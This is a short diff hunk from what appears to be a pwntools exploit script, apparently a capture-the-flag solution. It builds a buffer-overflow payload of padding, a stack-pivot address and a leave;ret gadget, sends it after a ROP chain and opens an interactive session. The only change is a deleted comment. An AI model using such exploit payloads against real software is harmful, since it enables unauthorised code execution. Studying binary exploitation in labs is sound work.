@@ -19,7 +19,7 @@ r.sendline(ropchain)
 r.recvuntil('> ')
 payload="a"*32
 payload+=p64(pivot_addr)
-#write
+
 payload+=p64(leaveret)
 r.sendline(payload)
 r.interactive()
